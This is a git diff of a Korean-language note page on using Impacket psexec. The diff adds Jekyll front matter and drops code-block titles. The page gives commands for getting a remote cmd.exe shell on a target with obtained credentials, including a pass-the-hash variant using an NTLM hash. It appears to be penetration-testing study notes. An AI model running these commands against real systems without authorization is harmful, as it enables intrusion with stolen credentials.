@@ -1,4 +1,11 @@
-
+---
+layout: page
+title: psexec
+description: >
+  This chapter covers the basics of content creation with Hydejack.
+hide_description: true
+sitemap: false
+---
 
 # Impacket-psexec 원격 실행 가이드
 
@@ -11,14 +18,14 @@
 - **목표:** 획득한 자격증명을 사용하여 대상 시스템의 `cmd.exe` 셸을 획득합니다.
 - **팁:** `rlwrap`과 함께 사용하면 화살표 키를 통한 명령어 히스토리 조회가 가능해져 훨씬 편리합니다.
 
-```bash title="비밀번호를 이용한 접속"
+```bash
 # -u: 사용자 이름
 # -p: 비밀번호
 # @<target>: 타겟 IP 주소 또는 호스트명
 rlwrap impacket-psexec <domain>/<user>:<password>@$target
 ```
 
-```bash title="Pass-the-Hash (PTH) 접속"
+```bash
 # -hashes: NTLM 해시 (LM해시는 비워둠)
 rlwrap impacket-psexec <domain>/<user>@$target -hashes :<ntlm_hash>
 ```
